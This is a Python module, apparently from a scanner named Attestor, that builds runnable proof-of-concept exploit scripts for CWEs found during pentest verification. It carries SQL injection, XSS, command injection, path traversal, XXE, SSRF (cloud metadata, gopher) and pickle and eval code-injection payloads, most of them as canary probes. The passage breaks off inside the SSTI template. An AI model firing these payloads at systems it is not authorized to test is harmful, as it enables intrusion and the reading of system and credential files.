#!/usr/bin/env python3
"""CWE-to-PoC generator: turns scanner findings into proof-of-concept exploit code.

Owen already knows where the bug is. This module writes the code that proves
it's exploitable — deterministically, without an LLM, from the finding alone.

The output is complete, runnable Python. Not scaffolding, not stubs, not
pseudocode. A pentester copies it, runs it, and gets a clear yes-or-no answer.

Architecture:
    Finding (from detect.py / taint analysis)
       |
    CWE registry --> generator function
       |
    ProofOfConcept
       |- code: complete Python script
       |- verification: how to know it worked
       |- vectors: techniques used
       +- references: CWE / OWASP / CAPEC

The principle: for any domain where the output structure is determined by the
input structure, you do not need an LLM — you need a code generator. Exploit
PoCs for known CWEs are exactly that domain. The attack patterns are finite
and well-characterized; the parameterization comes from the finding context.
"""
from __future__ import annotations

import ast
import re
from dataclasses import dataclass, field
from typing import Any, Callable


VERSION = "4.2"


# --------------------------------------------------------------------------- #
# schemas
# --------------------------------------------------------------------------- #

@dataclass
class PocFinding:
    """What the scanner found. Adapts detect.py's Finding for PoC generation."""
    cwe: int
    rule: str
    file_path: str
    line: int
    language: str = "unknown"
    source: str | None = None
    sink: str | None = None
    snippet: str = ""
    message: str = ""
    context: dict[str, Any] = field(default_factory=dict)

    def __post_init__(self):
        if not isinstance(self.cwe, int) or self.cwe < 1:
            raise ValueError("cwe must be a positive integer")
        if not self.rule:
            raise ValueError("rule must not be empty")


@dataclass
class ProofOfConcept:
    """A complete, runnable exploit that proves a finding is real."""
    cwe: int
    title: str
    code: str
    language: str = "python"
    verification: str = ""
    vectors: tuple[str, ...] = ()
    prerequisites: tuple[str, ...] = ("python3", "pip install requests")
    references: tuple[str, ...] = ()


class PocGenError(ValueError):
    """A PoC could not be generated for this finding."""


# --------------------------------------------------------------------------- #
# registry
# --------------------------------------------------------------------------- #

_REGISTRY: dict[int, Callable[[PocFinding], list[ProofOfConcept]]] = {}


def poc(cwe: int):
    """Register a PoC generator for a CWE."""
    def decorator(fn: Callable[[PocFinding], list[ProofOfConcept]]):
        _REGISTRY[cwe] = fn
        return fn
    return decorator


# --------------------------------------------------------------------------- #
# public API
# --------------------------------------------------------------------------- #

def generate(finding: PocFinding) -> list[ProofOfConcept]:
    """Generate PoCs for a finding. Returns [] if the CWE is unsupported."""
    gen = _REGISTRY.get(finding.cwe)
    if gen is None:
        return []
    result = gen(finding)
    return result if isinstance(result, list) else [result]


def supported_cwes() -> tuple[int, ...]:
    """CWE numbers this module can generate PoCs for."""
    return tuple(sorted(_REGISTRY))


def validate_poc(p: ProofOfConcept) -> tuple[bool, str]:
    """Check that a generated PoC is syntactically valid Python."""
    try:
        ast.parse(p.code)
        return True, "valid"
    except SyntaxError as e:
        return False, "syntax error at line %d: %s" % (e.lineno or 0, e.msg)


def from_detect_finding(finding: Any, cwe_map: dict[str, str] | None = None) -> PocFinding:
    """Adapt a detect.py Finding into a PocFinding."""
    cwe_str = ""
    if cwe_map:
        cwe_str = cwe_map.get(finding.rule, "")
    if not cwe_str and hasattr(finding, "cwe"):
        cwe_str = getattr(finding, "cwe", "")
    cwe_num = 0
    if cwe_str:
        m = re.search(r"(\d+)", str(cwe_str))
        if m:
            cwe_num = int(m.group(1))
    return PocFinding(
        cwe=cwe_num,
        rule=finding.rule,
        file_path=finding.path,
        line=finding.line,
        snippet=getattr(finding, "snippet", ""),
        message=getattr(finding, "message", ""),
    )


# --------------------------------------------------------------------------- #
# template helpers
# --------------------------------------------------------------------------- #

def _fill(template: str, **kw: Any) -> str:
    """Replace %%KEY%% placeholders in a code template."""
    for key, value in kw.items():
        template = template.replace("%%" + key + "%%", str(value))
    return template


def _ctx(finding: PocFinding, key: str, default: str = "") -> str:
    return finding.context.get(key, default)


def _endpoint(f: PocFinding) -> str:
    return _ctx(f, "endpoint", "http://TARGET/endpoint")


def _method(f: PocFinding) -> str:
    return _ctx(f, "method", "GET")


def _param(f: PocFinding) -> str:
    return f.source or _ctx(f, "param", "id")


def _refs(cwe: int, owasp: str = "", capec: str = "") -> tuple[str, ...]:
    refs = ["https://cwe.mitre.org/data/definitions/%d.html" % cwe]
    if owasp:
        refs.append("OWASP: %s" % owasp)
    if capec:
        refs.append("https://capec.mitre.org/data/definitions/%s.html" % capec)
    return tuple(refs)


def _header(cwe: int, title: str, f: PocFinding) -> str:
    """Standard PoC script header."""
    return (
        '#!/usr/bin/env python3\n'
        '"""%s PoC -- CWE-%d\n'
        'Found by: Attestor rule %s at %s:%d\n'
        '"""\n'
    ) % (title, cwe, f.rule, f.file_path, f.line)


# =========================================================================== #
# GENERATORS — each one produces a complete, runnable exploit script
# =========================================================================== #

# --------------------------------------------------------------------------- #
# CWE-89: SQL Injection
# --------------------------------------------------------------------------- #

_SQLI_CODE = r'''%%HEADER%%
import requests
import sys
import time

TARGET = "%%ENDPOINT%%"
PARAM = "%%PARAM%%"
METHOD = "%%METHOD%%"

BOOLEAN_PAYLOADS = [
    ("' OR '1'='1", "' OR '1'='2"),
    ("1 OR 1=1", "1 OR 1=2"),
    ("' OR 'x'='x", "' OR 'x'='y"),
]

ERROR_PAYLOADS = [
    "'",
    "' AND 1=CONVERT(int,'test')--",
    "1' ORDER BY 100--",
    "' UNION SELECT NULL--",
]

TIME_PAYLOADS = [
    ("' OR SLEEP(3)--", "MySQL"),
    ("'; WAITFOR DELAY '0:0:3'--", "MSSQL"),
    ("' OR pg_sleep(3)--", "PostgreSQL"),
    ("' OR LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(300000000))))--", "SQLite"),
]


def send(session, payload):
    if METHOD.upper() == "POST":
        return session.post(TARGET, data={PARAM: payload}, timeout=10)
    return session.get(TARGET, params={PARAM: payload}, timeout=10)


def test_boolean_blind(session):
    for true_p, false_p in BOOLEAN_PAYLOADS:
        try:
            r_true = send(session, true_p)
            r_false = send(session, false_p)
        except Exception as e:
            continue
        if abs(len(r_true.text) - len(r_false.text)) > 50:
            return True, ("response length differs (true=%d, false=%d) "
                         "with payload: %s" % (len(r_true.text), len(r_false.text), true_p))
    return False, "no boolean-blind difference detected"


def test_error_based(session):
    indicators = ["sql", "syntax", "mysql", "postgresql", "oracle", "sqlite",
                  "microsoft", "ORA-", "PG::", "SQLSTATE", "unclosed quotation"]
    for payload in ERROR_PAYLOADS:
        try:
            r = send(session, payload)
        except Exception:
            continue
        body = r.text.lower()
        for ind in indicators:
            if ind.lower() in body:
                return True, "SQL error keyword '%s' in response with: %s" % (ind, payload)
    return False, "no SQL error indicators"


def test_time_based(session):
    try:
        start = time.time()
        send(session, "1")
        baseline = time.time() - start
    except Exception:
        baseline = 0.5

    for payload, db in TIME_PAYLOADS:
        start = time.time()
        try:
            send(session, payload)
        except requests.exceptions.Timeout:
            return True, "request timed out with %s payload: %s" % (db, payload)
        except Exception:
            continue
        elapsed = time.time() - start
        if elapsed > baseline + 2.5:
            return True, ("response delayed %.1fs (baseline %.1fs) with %s "
                         "payload: %s" % (elapsed, baseline, db, payload))
    return False, "no time-based delay detected"


if __name__ == "__main__":
    print("=== SQL Injection PoC -- CWE-89 ===")
    print("Target: %s" % TARGET)
    print("Parameter: %s" % PARAM)
    print("Method: %s" % METHOD)
    print()

    session = requests.Session()
    session.headers["User-Agent"] = "Attestor-PoC/4.2"
    results = []

    for name, fn in [("Boolean Blind", test_boolean_blind),
                     ("Error Based", test_error_based),
                     ("Time Based", test_time_based)]:
        try:
            found, detail = fn(session)
            status = "VULNERABLE" if found else "not confirmed"
            results.append((name, found, detail))
            print("  [%s] %s: %s" % (status, name, detail))
        except Exception as e:
            print("  [ERROR] %s: %s" % (name, e))
            results.append((name, False, str(e)))

    print()
    if any(r[1] for r in results):
        print("RESULT: SQL injection confirmed -- at least one vector succeeded")
        sys.exit(1)
    else:
        print("RESULT: not confirmed -- manual verification recommended")
        sys.exit(0)
'''


@poc(89)
def _sql_injection(f: PocFinding) -> list[ProofOfConcept]:
    code = _fill(_SQLI_CODE,
                 HEADER=_header(89, "SQL Injection", f),
                 ENDPOINT=_endpoint(f),
                 PARAM=_param(f),
                 METHOD=_method(f))
    return [ProofOfConcept(
        cwe=89,
        title="SQL Injection (boolean/error/time-based)",
        code=code,
        verification="At least one test function returns VULNERABLE",
        vectors=("boolean-blind", "error-based", "union-based", "time-based"),
        references=_refs(89, "A03:2021 Injection", "66"),
    )]


# --------------------------------------------------------------------------- #
# CWE-79: Cross-Site Scripting (XSS)
# --------------------------------------------------------------------------- #

_XSS_CODE = r'''%%HEADER%%
import requests
import sys
import html
import hashlib
import time

TARGET = "%%ENDPOINT%%"
PARAM = "%%PARAM%%"
METHOD = "%%METHOD%%"

CANARY = "ATTESTOR" + hashlib.md5(str(time.time()).encode()).hexdigest()[:8]

PAYLOADS = [
    # Basic reflection
    ("<script>alert('%s')</script>" % CANARY,
     CANARY, "basic script tag"),
    # Attribute escape
    ('" onmouseover="alert(\'%s\')" x="' % CANARY,
     "onmouseover", "attribute injection"),
    # Event handler
    ("<img src=x onerror=alert('%s')>" % CANARY,
     "onerror", "event handler via img"),
    # SVG
    ("<svg onload=alert('%s')>" % CANARY,
     "onload", "SVG onload"),
    # Template literal (JS context)
    ("${alert('%s')}" % CANARY,
     "${alert", "template literal injection"),
]


def send(session, payload):
    if METHOD.upper() == "POST":
        return session.post(TARGET, data={PARAM: payload}, timeout=10)
    return session.get(TARGET, params={PARAM: payload}, timeout=10)


def test_reflection(session):
    results = []
    for payload, marker, technique in PAYLOADS:
        try:
            r = send(session, payload)
        except Exception:
            continue
        if marker in r.text:
            encoded_check = html.escape(marker)
            if encoded_check in r.text and marker not in r.text.replace(encoded_check, ""):
                results.append((False, "%s: reflected but HTML-encoded" % technique))
            else:
                results.append((True, "%s: unencoded reflection of '%s'" % (technique, marker)))
        else:
            results.append((False, "%s: not reflected" % technique))
    return results


if __name__ == "__main__":
    print("=== XSS PoC -- CWE-79 ===")
    print("Target: %s" % TARGET)
    print("Parameter: %s" % PARAM)
    print("Canary: %s" % CANARY)
    print()

    session = requests.Session()
    session.headers["User-Agent"] = "Attestor-PoC/4.2"

    confirmed = False
    for found, detail in test_reflection(session):
        status = "VULNERABLE" if found else "not confirmed"
        if found:
            confirmed = True
        print("  [%s] %s" % (status, detail))

    print()
    if confirmed:
        print("RESULT: XSS confirmed -- unencoded payload reflected in response")
        sys.exit(1)
    else:
        print("RESULT: not confirmed -- payloads were encoded or not reflected")
        sys.exit(0)
'''


@poc(79)
def _xss(f: PocFinding) -> list[ProofOfConcept]:
    code = _fill(_XSS_CODE,
                 HEADER=_header(79, "Cross-Site Scripting", f),
                 ENDPOINT=_endpoint(f),
                 PARAM=_param(f),
                 METHOD=_method(f))
    return [ProofOfConcept(
        cwe=79,
        title="XSS (reflected, multiple contexts)",
        code=code,
        verification="Unencoded payload marker appears in response body",
        vectors=("script-tag", "attribute-injection", "event-handler", "svg-onload",
                 "template-literal"),
        references=_refs(79, "A03:2021 Injection", "86"),
    )]


# --------------------------------------------------------------------------- #
# CWE-78: OS Command Injection
# --------------------------------------------------------------------------- #

_CMDI_CODE = r'''%%HEADER%%
import requests
import sys
import time
import hashlib

TARGET = "%%ENDPOINT%%"
PARAM = "%%PARAM%%"
METHOD = "%%METHOD%%"

CANARY = "ATTESTOR_" + hashlib.md5(str(time.time()).encode()).hexdigest()[:12]

SEPARATORS = [
    ("; echo %s", "semicolon"),
    ("| echo %s", "pipe"),
    ("&& echo %s", "and-chain"),
    ("|| echo %s", "or-chain"),
    ("`echo %s`", "backtick"),
    ("$(echo %s)", "dollar-paren"),
]

TIME_PAYLOADS = [
    ("; sleep 3", "unix-sleep"),
    ("| sleep 3", "unix-pipe-sleep"),
    ("& ping -n 4 127.0.0.1 &", "windows-ping"),
    ("; ping -c 4 127.0.0.1", "unix-ping"),
]


def send(session, payload):
    if METHOD.upper() == "POST":
        return session.post(TARGET, data={PARAM: payload}, timeout=15)
    return session.get(TARGET, params={PARAM: payload}, timeout=15)


def test_echo_canary(session):
    for template, technique in SEPARATORS:
        payload = template % CANARY
        try:
            r = send(session, payload)
        except Exception:
            continue
        if CANARY in r.text:
            return True, "canary '%s' reflected via %s: %s" % (CANARY, technique, payload)
    return False, "no echo canary reflected"


def test_time_based(session):
    try:
        start = time.time()
        send(session, "harmless")
        baseline = time.time() - start
    except Exception:
        baseline = 0.5

    for payload, technique in TIME_PAYLOADS:
        start = time.time()
        try:
            send(session, payload)
        except requests.exceptions.Timeout:
            return True, "timeout with %s: %s" % (technique, payload)
        except Exception:
            continue
        elapsed = time.time() - start
        if elapsed > baseline + 2.5:
            return True, ("delayed %.1fs (baseline %.1fs) with %s: %s"
                         % (elapsed, baseline, technique, payload))
    return False, "no time delay detected"


if __name__ == "__main__":
    print("=== Command Injection PoC -- CWE-78 ===")
    print("Target: %s" % TARGET)
    print("Parameter: %s" % PARAM)
    print("Canary: %s" % CANARY)
    print()

    session = requests.Session()
    session.headers["User-Agent"] = "Attestor-PoC/4.2"

    found_echo, detail_echo = test_echo_canary(session)
    print("  [%s] Echo canary: %s" % ("VULNERABLE" if found_echo else "not confirmed", detail_echo))

    found_time, detail_time = test_time_based(session)
    print("  [%s] Time-based: %s" % ("VULNERABLE" if found_time else "not confirmed", detail_time))

    print()
    if found_echo or found_time:
        print("RESULT: command injection confirmed")
        sys.exit(1)
    else:
        print("RESULT: not confirmed -- manual verification recommended")
        sys.exit(0)
'''


@poc(78)
def _command_injection(f: PocFinding) -> list[ProofOfConcept]:
    code = _fill(_CMDI_CODE,
                 HEADER=_header(78, "Command Injection", f),
                 ENDPOINT=_endpoint(f),
                 PARAM=_param(f),
                 METHOD=_method(f))
    return [ProofOfConcept(
        cwe=78,
        title="OS Command Injection (echo canary + time-based)",
        code=code,
        verification="Canary string appears in response, or response is delayed",
        vectors=("semicolon", "pipe", "and-chain", "or-chain", "backtick",
                 "dollar-paren", "time-based"),
        references=_refs(78, "A03:2021 Injection", "88"),
    )]


# --------------------------------------------------------------------------- #
# CWE-22/23/36: Path Traversal
# --------------------------------------------------------------------------- #

_PATHTR_CODE = r'''%%HEADER%%
import requests
import sys

TARGET = "%%ENDPOINT%%"
PARAM = "%%PARAM%%"
METHOD = "%%METHOD%%"

UNIX_TARGETS = [
    ("/etc/passwd", "root:"),
    ("/etc/hostname", None),
    ("/proc/self/environ", "PATH="),
]

WINDOWS_TARGETS = [
    ("C:\\Windows\\win.ini", "[fonts]"),
    ("C:\\Windows\\System32\\drivers\\etc\\hosts", "localhost"),
]

TRAVERSAL_PREFIXES = [
    "../" * 8,
    "..\\",
    "....//....//....//....//",
    "..%2f" * 8,
    "%2e%2e%2f" * 8,
    "..%252f" * 8,
    "..%c0%af" * 8,
    "..%255c" * 4,
]


def send(session, payload):
    if METHOD.upper() == "POST":
        return session.post(TARGET, data={PARAM: payload}, timeout=10)
    return session.get(TARGET, params={PARAM: payload}, timeout=10)


def test_traversal(session):
    results = []
    for targets, label in [(UNIX_TARGETS, "Unix"), (WINDOWS_TARGETS, "Windows")]:
        for target_file, marker in targets:
            clean_name = target_file.replace("\\", "/").split("/")[-1]
            for prefix in TRAVERSAL_PREFIXES:
                if "\\" in prefix:
                    payload = prefix * 4 + target_file.replace("/", "\\")
                else:
                    payload = prefix + target_file.lstrip("/")
                try:
                    r = send(session, payload)
                except Exception:
                    continue
                if r.status_code == 200 and len(r.text) > 0:
                    if marker and marker in r.text:
                        results.append((True,
                            "%s: read %s via '%s' -- marker '%s' found"
                            % (label, clean_name, prefix[:12] + "...", marker)))
                        return results
                    elif marker is None and len(r.text) > 1:
                        results.append((True,
                            "%s: possible read of %s via '%s' -- got %d bytes"
                            % (label, clean_name, prefix[:12] + "...", len(r.text))))
    if not results:
        results.append((False, "no file content markers detected"))
    return results


if __name__ == "__main__":
    print("=== Path Traversal PoC -- CWE-22 ===")
    print("Target: %s" % TARGET)
    print("Parameter: %s" % PARAM)
    print()

    session = requests.Session()
    session.headers["User-Agent"] = "Attestor-PoC/4.2"

    confirmed = False
    for found, detail in test_traversal(session):
        status = "VULNERABLE" if found else "not confirmed"
        if found:
            confirmed = True
        print("  [%s] %s" % (status, detail))

    print()
    if confirmed:
        print("RESULT: path traversal confirmed -- arbitrary file read demonstrated")
        sys.exit(1)
    else:
        print("RESULT: not confirmed -- manual verification recommended")
        sys.exit(0)
'''


@poc(22)
def _path_traversal_22(f: PocFinding) -> list[ProofOfConcept]:
    code = _fill(_PATHTR_CODE,
                 HEADER=_header(22, "Path Traversal", f),
                 ENDPOINT=_endpoint(f),
                 PARAM=_param(f),
                 METHOD=_method(f))
    return [ProofOfConcept(
        cwe=22,
        title="Path Traversal (multi-encoding, Unix+Windows)",
        code=code,
        verification="Known file markers (root:, [fonts]) appear in response",
        vectors=("dot-dot-slash", "backslash", "double-encoding", "unicode-encoding",
                 "overlong-utf8"),
        references=_refs(22, "A01:2021 Broken Access Control", "126"),
    )]

# CWE-23 and CWE-36 are siblings — same attack, same PoC
@poc(23)
def _path_traversal_23(f: PocFinding) -> list[ProofOfConcept]:
    return _path_traversal_22(f)

@poc(36)
def _path_traversal_36(f: PocFinding) -> list[ProofOfConcept]:
    return _path_traversal_22(f)


# --------------------------------------------------------------------------- #
# CWE-611: XML External Entity (XXE)
# --------------------------------------------------------------------------- #

_XXE_CODE = r'''%%HEADER%%
import requests
import sys

TARGET = "%%ENDPOINT%%"

PAYLOADS = [
    # Classic external entity — read /etc/passwd
    ("""<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ELEMENT foo ANY>
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<foo>&xxe;</foo>""",
     "root:", "classic-xxe-unix"),

    # Windows variant
    ("""<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///C:/Windows/win.ini">
]>
<foo>&xxe;</foo>""",
     "[fonts]", "classic-xxe-windows"),

    # Parameter entity (bypasses some filters)
    ("""<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "file:///etc/hostname">
  <!ENTITY % eval "<!ENTITY exfil SYSTEM 'file:///etc/hostname'>">
  %eval;
]>
<foo>&exfil;</foo>""",
     None, "parameter-entity"),

    # XInclude (when you don't control the DOCTYPE)
    ("""<foo xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include parse="text" href="file:///etc/passwd"/>
</foo>""",
     "root:", "xinclude"),
]


if __name__ == "__main__":
    print("=== XXE PoC -- CWE-611 ===")
    print("Target: %s" % TARGET)
    print()

    session = requests.Session()
    session.headers["User-Agent"] = "Attestor-PoC/4.2"
    session.headers["Content-Type"] = "application/xml"

    confirmed = False
    for payload, marker, technique in PAYLOADS:
        try:
            r = session.post(TARGET, data=payload.encode("utf-8"), timeout=10)
        except Exception as e:
            print("  [ERROR] %s: %s" % (technique, e))
            continue

        if marker and marker in r.text:
            print("  [VULNERABLE] %s: marker '%s' found in response" % (technique, marker))
            confirmed = True
        elif marker is None and r.status_code == 200 and len(r.text.strip()) > 0:
            print("  [POSSIBLE] %s: got %d bytes (check manually)" % (technique, len(r.text)))
        else:
            print("  [not confirmed] %s" % technique)

    print()
    if confirmed:
        print("RESULT: XXE confirmed -- file content exfiltrated via XML entity")
        sys.exit(1)
    else:
        print("RESULT: not confirmed -- manual verification recommended")
        sys.exit(0)
'''


@poc(611)
def _xxe(f: PocFinding) -> list[ProofOfConcept]:
    code = _fill(_XXE_CODE,
                 HEADER=_header(611, "XML External Entity", f),
                 ENDPOINT=_endpoint(f))
    return [ProofOfConcept(
        cwe=611,
        title="XXE (classic, parameter entity, XInclude)",
        code=code,
        verification="Known file markers appear in XML response",
        vectors=("classic-external-entity", "parameter-entity", "xinclude"),
        prerequisites=("python3", "pip install requests"),
        references=_refs(611, "A05:2021 Security Misconfiguration", "201"),
    )]


# --------------------------------------------------------------------------- #
# CWE-918: Server-Side Request Forgery (SSRF)
# --------------------------------------------------------------------------- #

_SSRF_CODE = r'''%%HEADER%%
import requests
import sys
import time

TARGET = "%%ENDPOINT%%"
PARAM = "%%PARAM%%"
METHOD = "%%METHOD%%"

INTERNAL_PROBES = [
    ("http://127.0.0.1/", "loopback"),
    ("http://localhost/", "localhost"),
    ("http://[::1]/", "ipv6-loopback"),
    ("http://0.0.0.0/", "zero-addr"),
    ("http://169.254.169.254/latest/meta-data/", "aws-metadata"),
    ("http://metadata.google.internal/computeMetadata/v1/", "gcp-metadata"),
    ("http://169.254.169.254/metadata/instance?api-version=2021-02-01", "azure-metadata"),
    ("http://100.100.100.200/latest/meta-data/", "alibaba-metadata"),
]

SCHEME_PROBES = [
    ("file:///etc/passwd", "root:", "file-protocol-unix"),
    ("file:///C:/Windows/win.ini", "[fonts]", "file-protocol-windows"),
    ("gopher://127.0.0.1:6379/_INFO", "redis", "gopher-redis"),
]

BYPASS_PREFIXES = [
    "http://127.1/",
    "http://0x7f000001/",
    "http://2130706433/",
    "http://017700000001/",
    "http://127.0.0.1.nip.io/",
]


def send(session, url_payload):
    if METHOD.upper() == "POST":
        return session.post(TARGET, data={PARAM: url_payload}, timeout=10)
    return session.get(TARGET, params={PARAM: url_payload}, timeout=10)


if __name__ == "__main__":
    print("=== SSRF PoC -- CWE-918 ===")
    print("Target: %s" % TARGET)
    print("Parameter: %s" % PARAM)
    print()

    session = requests.Session()
    session.headers["User-Agent"] = "Attestor-PoC/4.2"

    # Baseline: send a benign external URL
    try:
        r_base = send(session, "http://example.com")
        baseline_len = len(r_base.text)
        baseline_status = r_base.status_code
    except Exception:
        baseline_len = 0
        baseline_status = 0

    confirmed = False

    print("  Internal targets:")
    for probe_url, label in INTERNAL_PROBES:
        try:
            r = send(session, probe_url)
            if r.status_code == 200 and len(r.text) > 0:
                if len(r.text) != baseline_len:
                    print("    [VULNERABLE] %s: got %d bytes (baseline %d)"
                          % (label, len(r.text), baseline_len))
                    confirmed = True
                    continue
        except Exception:
            pass
        print("    [not confirmed] %s" % label)

    print("  Scheme probes:")
    for probe_url, marker, label in SCHEME_PROBES:
        try:
            r = send(session, probe_url)
            if marker and marker in r.text:
                print("    [VULNERABLE] %s: marker '%s' found" % (label, marker))
                confirmed = True
                continue
        except Exception:
            pass
        print("    [not confirmed] %s" % label)

    print("  Filter bypasses:")
    for probe_url in BYPASS_PREFIXES:
        label = probe_url.split("//")[1].split("/")[0]
        try:
            r = send(session, probe_url)
            if r.status_code == 200 and len(r.text) > 0 and len(r.text) != baseline_len:
                print("    [VULNERABLE] bypass via %s: got %d bytes" % (label, len(r.text)))
                confirmed = True
                continue
        except Exception:
            pass
        print("    [not confirmed] %s" % label)

    print()
    if confirmed:
        print("RESULT: SSRF confirmed -- internal/cloud resource accessible")
        sys.exit(1)
    else:
        print("RESULT: not confirmed -- manual verification recommended")
        sys.exit(0)
'''


@poc(918)
def _ssrf(f: PocFinding) -> list[ProofOfConcept]:
    code = _fill(_SSRF_CODE,
                 HEADER=_header(918, "Server-Side Request Forgery", f),
                 ENDPOINT=_endpoint(f),
                 PARAM=_param(f),
                 METHOD=_method(f))
    return [ProofOfConcept(
        cwe=918,
        title="SSRF (internal probes, cloud metadata, protocol smuggling)",
        code=code,
        verification="Internal/cloud resource responds differently from baseline",
        vectors=("loopback", "cloud-metadata-aws", "cloud-metadata-gcp",
                 "cloud-metadata-azure", "file-protocol", "gopher", "ip-bypass"),
        references=_refs(918, "A10:2021 SSRF", "664"),
    )]


# --------------------------------------------------------------------------- #
# CWE-502: Unsafe Deserialization
# --------------------------------------------------------------------------- #

_DESER_CODE = r'''%%HEADER%%
import sys
import hashlib
import time

SERIALIZATION_FORMAT = "%%FORMAT%%"
TARGET = "%%ENDPOINT%%"
CANARY = "ATTESTOR_DESER_" + hashlib.md5(str(time.time()).encode()).hexdigest()[:8]


def python_pickle_payload():
    """Generate a pickle that executes a canary echo on deserialization."""
    import pickle
    import struct

    class Canary:
        def __reduce__(self):
            import os
            return (os.system, ("echo %s" % CANARY,))

    return pickle.dumps(Canary(), protocol=2)


def java_payload_probe():
    """Detect Java deserialization by sending a malformed serialized object."""
    # Java serialization magic bytes: AC ED 00 05
    # Followed by garbage — if the server throws a Java deserialization error,
    # we know it's deserializing untrusted input
    magic = b"\xac\xed\x00\x05"
    garbage = b"\x73\x72\x00\x00"  # truncated class descriptor
    return magic + garbage


def php_payload():
    """PHP object injection probe."""
    return ('O:8:"Attestor":1:{s:4:"test";s:' + str(len(CANARY))
            + ':"' + CANARY + '";}').encode()


def dotnet_payload_probe():
    """Detect .NET BinaryFormatter deserialization."""
    # BinaryFormatter magic: 00 01 00 00 00 FF FF FF FF
    return b"\x00\x01\x00\x00\x00\xff\xff\xff\xff\x01\x00\x00\x00\x00\x00\x00\x00"


ERROR_INDICATORS = {
    "java": ["java.io.InvalidClassException", "java.io.StreamCorruptedException",
             "ClassNotFoundException", "ObjectInputStream", "serialVersionUID",
             "java.io.EOFException"],
    "python": ["unpickle", "pickle", "UnpicklingError", "_pickle",
               "cPickle", "restricted unpickler"],
    "php": ["unserialize()", "__wakeup", "__destruct", "O:"],
    "dotnet": ["BinaryFormatter", "SerializationException", "TypeLoadException",
               "System.Runtime.Serialization"],
}


if __name__ == "__main__":
    import requests

    print("=== Deserialization PoC -- CWE-502 ===")
    print("Target: %s" % TARGET)
    print("Format: %s" % SERIALIZATION_FORMAT)
    print()

    session = requests.Session()
    session.headers["User-Agent"] = "Attestor-PoC/4.2"

    probes = {
        "java": (java_payload_probe, "application/x-java-serialized-object"),
        "python": (python_pickle_payload, "application/x-python-pickle"),
        "php": (php_payload, "application/x-php-serialized"),
        "dotnet": (dotnet_payload_probe, "application/x-dotnet-serialized"),
    }

    formats_to_test = ([SERIALIZATION_FORMAT] if SERIALIZATION_FORMAT in probes
                       else list(probes.keys()))

    confirmed = False
    for fmt in formats_to_test:
        gen_fn, content_type = probes[fmt]
        try:
            payload = gen_fn()
            r = session.post(TARGET, data=payload,
                             headers={"Content-Type": content_type}, timeout=10)
        except Exception as e:
            print("  [ERROR] %s: %s" % (fmt, e))
            continue

        for indicator in ERROR_INDICATORS.get(fmt, []):
            if indicator.lower() in r.text.lower():
                print("  [VULNERABLE] %s: deserialization error indicator '%s' in response"
                      % (fmt, indicator))
                confirmed = True
                break
        else:
            print("  [not confirmed] %s: no deserialization indicators" % fmt)

    print()
    if confirmed:
        print("RESULT: unsafe deserialization confirmed -- server processes untrusted serialized data")
        sys.exit(1)
    else:
        print("RESULT: not confirmed -- manual verification recommended")
        sys.exit(0)
'''


@poc(502)
def _deserialization(f: PocFinding) -> list[ProofOfConcept]:
    fmt = _ctx(f, "format", "auto")
    lang = f.language
    if fmt == "auto":
        fmt = {"java": "java", "python": "python", "php": "php",
               "csharp": "dotnet"}.get(lang, "java")
    code = _fill(_DESER_CODE,
                 HEADER=_header(502, "Unsafe Deserialization", f),
                 ENDPOINT=_endpoint(f),
                 FORMAT=fmt)
    return [ProofOfConcept(
        cwe=502,
        title="Unsafe Deserialization (%s)" % fmt,
        code=code,
        verification="Deserialization error indicators in response",
        vectors=("malformed-object", "error-fingerprinting"),
        references=_refs(502, "A08:2021 Software and Data Integrity Failures", "586"),
    )]


# --------------------------------------------------------------------------- #
# CWE-94: Code Injection (eval/exec)
# --------------------------------------------------------------------------- #

_CODEI_CODE = r'''%%HEADER%%
import requests
import sys
import hashlib
import time

TARGET = "%%ENDPOINT%%"
PARAM = "%%PARAM%%"
METHOD = "%%METHOD%%"

CANARY = "ATTESTOR_" + hashlib.md5(str(time.time()).encode()).hexdigest()[:8]

PAYLOADS = [
    # Python eval/exec
    ("__import__('os').popen('echo %s').read()" % CANARY,
     CANARY, "python-eval"),
    # Node.js
    ("require('child_process').execSync('echo %s').toString()" % CANARY,
     CANARY, "node-require"),
    # Ruby
    ("`echo %s`" % CANARY,
     CANARY, "ruby-backtick"),
    # PHP
    ("system('echo %s');" % CANARY,
     CANARY, "php-system"),
    # Math probe (language-agnostic — confirms eval without side effects)
    ("7*7*7", "343", "math-probe"),
    ("str(7*7*7)", "343", "python-math"),
]


def send(session, payload):
    if METHOD.upper() == "POST":
        return session.post(TARGET, data={PARAM: payload}, timeout=10)
    return session.get(TARGET, params={PARAM: payload}, timeout=10)


if __name__ == "__main__":
    print("=== Code Injection PoC -- CWE-94 ===")
    print("Target: %s" % TARGET)
    print("Parameter: %s" % PARAM)
    print("Canary: %s" % CANARY)
    print()

    session = requests.Session()
    session.headers["User-Agent"] = "Attestor-PoC/4.2"

    confirmed = False
    for payload, marker, technique in PAYLOADS:
        try:
            r = send(session, payload)
        except Exception as e:
            print("  [ERROR] %s: %s" % (technique, e))
            continue

        if marker in r.text:
            print("  [VULNERABLE] %s: marker '%s' found with payload: %s"
                  % (technique, marker, payload[:60]))
            confirmed = True
        else:
            print("  [not confirmed] %s" % technique)

    print()
    if confirmed:
        print("RESULT: code injection confirmed -- server evaluates untrusted input")
        sys.exit(1)
    else:
        print("RESULT: not confirmed -- manual verification recommended")
        sys.exit(0)
'''


@poc(94)
def _code_injection(f: PocFinding) -> list[ProofOfConcept]:
    code = _fill(_CODEI_CODE,
                 HEADER=_header(94, "Code Injection", f),
                 ENDPOINT=_endpoint(f),
                 PARAM=_param(f),
                 METHOD=_method(f))
    return [ProofOfConcept(
        cwe=94,
        title="Code Injection (eval/exec, multi-language)",
        code=code,
        verification="Canary or math result appears in response",
        vectors=("python-eval", "node-require", "ruby-backtick", "php-system", "math-probe"),
        references=_refs(94, "A03:2021 Injection", "35"),
    )]


# --------------------------------------------------------------------------- #
# CWE-917: Server-Side Template Injection (SSTI)
# --------------------------------------------------------------------------- #

_SSTI_CODE = r'''%%HEADER%%
import requests
import sys

TARGET = "%%ENDPOINT%%"
PARAM = "%%PARAM%%"
METHOD = "%%METHOD%%"

